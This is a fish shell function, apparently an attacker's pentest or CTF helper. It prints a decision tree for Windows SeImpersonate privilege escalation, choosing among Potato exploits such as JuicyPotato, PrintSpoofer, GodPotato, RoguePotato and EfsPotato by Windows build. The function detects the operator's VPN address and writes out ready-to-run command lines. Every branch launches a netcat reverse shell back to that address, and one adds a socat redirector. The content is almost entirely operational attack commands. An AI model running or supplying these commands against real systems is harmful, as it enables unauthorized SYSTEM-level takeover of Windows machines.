function potp --description 'potato decision tree: which one, and the exact line, for SeImpersonate privesc'
    set -l port 443
    test -n "$argv[1]"; and set port $argv[1]

    # tun0 first, same as winpwn, so the callback never gets the ethernet IP
    set -l ip (ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
    test -z "$ip"; and set ip (ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
    test -z "$ip"; and set ip LHOST

    set -l p "nc.exe $ip $port -e cmd"       # the payload every leaf runs
    set -l C (set_color cyan)
    set -l D (set_color brblack)
    set -l N (set_color normal)

    # backslash-bearing fragments kept in single quotes so fish never touches them
    set -l jpline 'jp64.exe -t * -p c:\windows\system32\cmd.exe -a "/c '$p'" -l 1337 -c {CLSID}'
    set -l clsidn 'clsid\<build>.list'
    set -l netdir 'dir %WINDIR%\Microsoft.NET\Framework64'

    echo
    echo "  gate  $D""whoami /priv | findstr /i impersonate$N"
    echo "  $D""SeImpersonate -> CreateProcessWithToken    SeAssignPrimaryToken -> CreateProcessAsUser    jp -t * tries both$N"
    echo
    echo "  neither, but you are a service acct (iis apppool / mssql / local|network service)"
    echo "  $C└─ FullPowers$N restores the token, then re-run this"
    echo "       fp.exe -c \"cmd /c $p\" -z"
    echo
    echo "  have one of them -> pick by Windows build"
    echo
    echo "  $C├─ <= Win10 1803 / <= Server 2016$N   JuicyPotato $D""needs a CLSID, dead on 1809+$N"
    echo "  $C│$N    $jpline"
    echo "  $C│$N  $D""CLSID from $clsidn ; 2008 R2 has 366, tcb.bat brutes them$N"
    echo "  $C│$N"
    echo "  $C└─ 1809+ / 2019+ / Win11 / 2022$N   $D""JuicyPotato is dead here, in try-order:$N"
    echo "       $C├─ Spooler running$N        PrintSpoofer $D""simplest, try first$N"
    echo "       $C│$N    ps64.exe -i -c \"$p\""
    echo "       $C│$N"
    echo "       $C├─ .NET present$N           GodPotato $D""the reliable no-network one$N"
    echo "       $C│$N    gp4.exe -cmd \"$p\"      $D""gp2 / gp35 for older .NET$N"
    echo "       $C│$N  $D""match it: $netdir$N"
    echo "       $C│$N    sig.exe --revshell $ip $port   $D""SigmaPotato, GodPotato fork, runs in-memory$N"
    echo "       $C│$N"
    echo "       $C├─ Spooler off, can bind :135 back to you$N   RoguePotato"
    echo "       $C│$N    you:     socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999"
    echo "       $C│$N    target:  rp.exe -r $ip -e \"$p\" -l 9999"
    echo "       $C│$N"
    echo "       $C└─ Spooler off, no redirector$N   EfsPotato / PrintNotifyPotato"
    echo "            efs.exe \"$p\" lsarpc   $D""pipes: lsarpc|efsrpc|samr|lsass|netlogon$N"
    echo "          $D""0x6d3 error = wrong pipe, try the next one$N"
    echo "            PrintNotifyPotato.exe cmd /c \"$p\"   $D""Spooler-off COM abuse, winpwn does not stage it$N"
    echo
    echo "  $D""payload is :$port, change it with  potp PORT . short names are winpwn's aliases.$N"
    echo
end
